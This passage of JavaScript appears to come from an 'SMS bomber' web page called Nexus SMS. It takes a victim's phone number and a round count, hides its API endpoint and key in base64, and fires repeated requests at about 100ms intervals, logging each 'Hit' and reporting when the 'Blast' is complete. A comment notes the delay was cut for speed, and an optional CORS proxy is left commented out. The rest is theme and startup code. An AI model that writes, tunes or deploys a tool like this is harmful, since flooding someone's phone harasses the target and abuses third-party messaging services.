            appendLog(`🌐 API: ampos-api-1.onrender.com (secured)`, 'info');

            let successCount = 0;
            let errorCount = 0;

            // Decode API URL and Key
            const baseUrl = decodeBase64(_base64Url);
            const apiKey = decodeBase64(_base64Key);

            for (let i = 1; i <= count; i++) {
                try {
                    // Build query parameters
                    const params = new URLSearchParams({
                        phone: formatted,
                        rounds: count,        // or i if you want incremental
                        key: apiKey
                    });
                    const url = `${baseUrl}?${params.toString()}`;

                    // Optional: if you face CORS issues, uncomment the proxy line below
                    // const proxy = 'https://corsproxy.io/?';
                    // const url = proxy + encodeURIComponent(`${baseUrl}?${params.toString()}`);

                    const resp = await fetch(url, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });

                    const text = await resp.text();
                    const short = text.length > 60 ? text.substring(0, 60) + '…' : text;

                    if (resp.ok) {
                        successCount++;
                        appendLog(`✅ [${i}/${count}] Hit · ${resp.status} → ${short}`, 'success');
                    } else {
                        errorCount++;
                        appendLog(`⚠️ [${i}/${count}] Miss · ${resp.status} → ${short}`, 'error');
                    }
                } catch (err) {
                    errorCount++;
                    appendLog(`💀 [${i}/${count}] Network fail · ${err.message.substring(0, 50)}`, 'error');
                }
                // --- SPEED IMPROVEMENT: reduced delay from 480-600ms to 100ms ---
                await new Promise(r => setTimeout(r, 100));
            }

            appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
            if (successCount > 0) {
                appendLog(`🏆 Blast complete! ✅ ${successCount} · ❌ ${errorCount}`, 'success');
                showToast(`Blast finished: ${successCount} successful`, 'success', 3000);
            } else {
                appendLog(`💔 All ${errorCount} requests failed.`, 'error');
                showToast('Blast failed entirely.', 'error', 3000);
            }

            isSending = false;
            btn.disabled = false;
            dom.sendBtnText.innerHTML = originalText;
        }

        // ----- THEME TOGGLE -----
        function toggleTheme() {
            const body = document.body;
            const isLight = body.classList.toggle('light');
            dom.themeIcon.className = isLight ? 'fas fa-sun' : 'fas fa-moon';
            localStorage.setItem('nexus_theme', isLight ? 'light' : 'dark');
        }

        function loadTheme() {
            const theme = localStorage.getItem('nexus_theme');
            if (theme === 'light') {
                document.body.classList.add('light');
                dom.themeIcon.className = 'fas fa-sun';
            } else {
                dom.themeIcon.className = 'fas fa-moon';
            }
        }

        // ----- INIT -----
        function init() {
            loadTheme();
            if (!dom.count.value) dom.count.value = '5';
            dom.themeToggle.addEventListener('click', toggleTheme);
            dom.phone.addEventListener('keydown', (e) => { if (e.key === 'Enter') dom.count.focus(); });
            dom.count.addEventListener('keydown', (e) => { if (e.key === 'Enter') startBlast(); });
            appendLog('🚀 Nexus SMS V1.0 initialized · ' + new Date().toLocaleString(), 'success');
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }

        // Expose functions globally
        window.startBlast = startBlast;
        window.clearLog = clearLog;
        window.showToast = showToast;
        window.toggleTheme = toggleTheme;
    </script>
